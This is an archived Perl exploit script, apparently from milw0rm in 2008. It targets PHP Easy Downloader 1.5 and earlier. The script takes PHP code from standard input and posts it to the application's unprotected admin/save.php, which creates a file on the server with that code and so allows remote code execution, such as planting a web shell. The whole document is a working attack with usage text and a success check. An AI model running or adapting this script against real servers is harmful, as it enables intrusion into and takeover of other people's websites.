<html><head><title>PHP Easy Downloader <= 1.5 Remote File Creation Exploit</title></head><pre>#!/usr/bin/perl
# --------------------------------------------------------
# PHP Easy Downloader &lt;= 1.5 Remote File Creation Exploit
# By StAkeR aka athos - StAkeR[at]hotmail[dot]it
# On 17/10/2008
# http://www.hasemithut.de/downloads/index.php
# --------------------------------------------------------

use strict;
use LWP::UserAgent;

my $host = shift(@ARGV);
my $file = shift(@ARGV);
my $http = new LWP::UserAgent;

if($host !~ /^http:\/\/(.+?)$/ &amp;&amp; $file !~ /(\w+)\.([a-zA-Z])?/)
{
  print &quot;[?] PHP Easy Downloader &lt;= 1.5 Remote File Creation Exploit\r\n&quot;;
  print &quot;[?] Usage: perl $0 http://[host] [filename]\r\n&quot;;
  exit;
}

chomp(my $code = &lt;STDIN&gt;);

if($code !~ /(&lt;\?php|&lt;\?#)(.*?)\?&gt;/)
{
  print &quot;[?] You must insert PHP Code\r\n&quot;;
  exit;
}
  
my $post = $http-&gt;post($host.'/file_info/admin/save.php',
                       [
                        filename    =&gt; $file,
                        accesses    =&gt; $code.'//',
                      ]); 

if($post-&gt;is_success)
{
  if($post-&gt;as_string =~ /(Upload Date|Change Made!)/i)
  {
    print &quot;[?] $host/file_info/descriptions/$file.0 Created\r\n&quot;;
    exit;
  }
  else
  {
    print &quot;[?] Exploit Failed!\r\n&quot;;
    exit;
  }
} 


__END__

# milw0rm.com [2008-10-18]</pre></html>